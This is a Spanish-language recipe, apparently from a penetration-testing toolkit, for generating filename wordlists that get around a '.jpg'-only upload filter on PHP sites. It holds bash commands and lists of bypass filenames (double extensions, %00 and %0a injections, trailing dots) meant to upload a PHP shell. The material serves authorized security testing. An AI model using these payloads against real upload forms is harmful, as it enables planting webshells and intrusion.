# 01 - PHP contra whitelist solo `.jpg`

## Objetivo

Generar filenames evasivos cuando la aplicación parece permitir únicamente archivos con extensión `.jpg`, pero queremos combinar esa extensión permitida con handlers PHP.

Este ejemplo es el equivalente práctico de empezar con algo como:

```text
shell.php.jpg
shell.jpg.php
shell.php%00.jpg
shell.jpg%00.php
shell.phtml.jpg
shell.jpg.phtml
```

pero generado desde diccionarios reutilizables.

## Cuándo usarlo

Usa este perfil cuando:

```text
[ ] El frontend o el backend solo acepta .jpg
[ ] El stack parece PHP o no estás seguro pero hay indicios de PHP
[ ] Quieres una lista pequeña/mediana, no una full wordlist enorme
[ ] Quieres centrarte en bypasses de filename/extensión
```

## Crear allowlist temporal

```bash
cd /opt/fileUpload
printf '.jpg\n' > wordlists/generated/allowed_jpg_only.txt
```

Contenido esperado:

```text
.jpg
```

## Generar diccionario

```bash
bin/gen_filename_wordlist.sh \
  wordlists/custom/php_exts.txt \
  wordlists/generated/php_jpg_only.txt \
  wordlists/generated/allowed_jpg_only.txt
```

## Entrada usada

Extensiones peligrosas:

```text
wordlists/custom/php_exts.txt
```

Extensiones permitidas:

```text
wordlists/generated/allowed_jpg_only.txt
```

Salida:

```text
wordlists/generated/php_jpg_only.txt
```

## Comprobaciones rápidas

```bash
wc -l wordlists/generated/php_jpg_only.txt
head -20 wordlists/generated/php_jpg_only.txt
```

Buscar familias concretas:

```bash
grep -E 'phtml|phar|%00|%0a' wordlists/generated/php_jpg_only.txt | head
```

## Ejemplos de salida esperada

```text
shell.php.jpg
shell.jpg.php
shell.phtml.jpg
shell.jpg.phtml
shell.phar.jpg
shell.jpg.phar
shell.php%00.jpg
shell.jpg%00.php
shell.php%0a.jpg
shell.jpg%0a.phtml
shell.php%20.jpg
shell.jpg%20.phar
shell.php..jpg
shell.jpg.php.
```

## Qué representa cada familia

| Patrón | Idea |
|---|---|
| `shell.php.jpg` | Handler peligroso antes de extensión permitida |
| `shell.jpg.php` | Extensión permitida antes del handler |
| `shell.php%00.jpg` | Control char/normalización entre handler y `.jpg` |
| `shell.jpg%00.php` | Control char entre `.jpg` y handler |
| `shell.php..jpg` | Confusión con puntos repetidos |
| `shell.jpg.php.` | Trailing dot / normalización |

## Variante

Si solo quieres PHP moderno y handlers comunes:

```bash
cat > wordlists/generated/php_exts_small.txt <<'EOF_SMALL'
.php
.phtml
.phar
.php5
EOF_SMALL

bin/gen_filename_wordlist.sh \
  wordlists/generated/php_exts_small.txt \
  wordlists/generated/php_jpg_small.txt \
  wordlists/generated/allowed_jpg_only.txt
```
